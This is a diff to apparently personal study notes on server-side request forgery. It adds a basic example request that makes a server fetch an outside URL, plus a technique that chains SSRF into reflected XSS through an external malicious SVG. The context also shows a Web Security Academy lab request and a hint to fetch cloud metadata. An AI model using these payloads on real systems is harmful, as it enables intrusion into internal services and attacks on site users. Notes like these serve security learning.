@@ -16,6 +16,11 @@
   
 ## EX:
 
+ 1. In a simple way - Attacker asks the server to fetch a URL for him
+
+      GET /?url=http://google.com/ HTTP/1.1
+      Host: example.com
+
     POST /product/stock HTTP/1.1
     Host: 0a6800110358b1bfc093443000f600a4.web-security-academy.net
     Cookie: session=mewjzSnDMV8c3uT7hIo493arKt9OuuH9
@@ -66,7 +71,13 @@
    
    If it runs on Cloud Instances try to fetch META-DATA
    
-   
+ ## SSRF to Reflected XSS -
+ 
+  Simply fetch a file from external sites which has malicious payload with content type served as html
+  
+  Example - http://localhost:4567/?url=http://brutelogic.com.br/poc.svg
+  
+  
    
    
     
